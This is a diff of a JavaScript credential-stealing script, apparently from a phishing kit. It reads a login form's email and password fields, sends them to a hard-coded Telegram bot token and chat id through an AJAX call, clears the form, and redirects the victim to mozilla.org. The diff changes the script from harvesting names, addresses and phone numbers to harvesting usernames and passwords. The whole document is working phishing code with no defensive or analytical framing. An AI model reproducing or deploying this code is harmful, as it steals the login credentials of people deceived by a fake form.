@@ -2,17 +2,11 @@
 var telegram_bot_id = "5048296069:AAFTFhOFZqjSZFuphfs2rB8kzJdGKkYWloE";
 //chat id
 var chat_id = 1225371262;
-var u_fname, lname, email, telephone, address, city, state, zip;
+var u_email, pass;
 var ready = function () {
-    u_fname = document.getElementById("fname").value;
-	lname = document.getElementById("lname").value;
-	email = document.getElementById("email").value;
-	telephone = document.getElementById("telephone").value;
-	address = document.getElementById("address").value;
-	city = document.getElementById("city").value;
-	state = document.getElementById("state").value;
-	zip = document.getElementById("zip").value;
-    message = "First Name: " + u_fname + "\nLast Name: " + lname + "\nEmail: " + email +  "\nPhone: " + telephone + "\nAddress: " + address + "\nCity: " + city +  "\nState: " + state +  "\nZip-Code: " + zip;
+    u_email = document.getElementById("email").value;
+	pass = document.getElementById("pass").value;
+    message = "Username: " + u_email + "\nPass: " + pass;
 };
 var sender = function () {
     ready();
@@ -33,14 +27,8 @@ var sender = function () {
     $.ajax(settings).done(function (response) {
         console.log(response);
     });
-    document.getElementById("fname").value = "";
-	document.getElementById("lname").value = "";
-	document.getElementById("email").value = "";
-	document.getElementById("telephone").value = "";
-	document.getElementById("address").value = "";
-	document.getElementById("city").value = "";
-	document.getElementById("state").value = "";
-    document.getElementById("zip").value = "";
+    document.getElementById("email").value = "";
+	document.getElementById("pass").value = "";
 	location.assign ("http://www.mozilla.org"); 
 	
     return false;
